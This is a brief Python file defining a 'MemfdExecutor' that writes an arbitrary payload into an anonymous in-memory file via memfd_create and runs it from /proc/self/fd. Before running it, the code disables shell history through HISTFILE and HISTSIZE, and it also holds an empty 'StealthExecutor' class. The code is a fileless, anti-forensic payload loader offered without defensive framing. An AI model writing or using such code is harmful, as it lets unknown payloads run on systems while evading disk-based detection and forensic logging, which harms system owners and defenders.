import ctypes
import subprocess
import os
libc = ctypes.CDLL(None)
class StealthExecutor:
    pass
class MemfdExecutor:
    def execute(self, payload):
        clean_env = os.environ.copy()
        clean_env['HISTFILE'] = '/dev/null'
        clean_env['HISTSIZE'] = '0'
        fd = libc.memfd_create(b"worker", 0)
        os.write(fd, payload)
        command = f"/proc/self/fd/{fd}"
        subprocess.run(command, env=clean_env, pass_fds=(fd,))
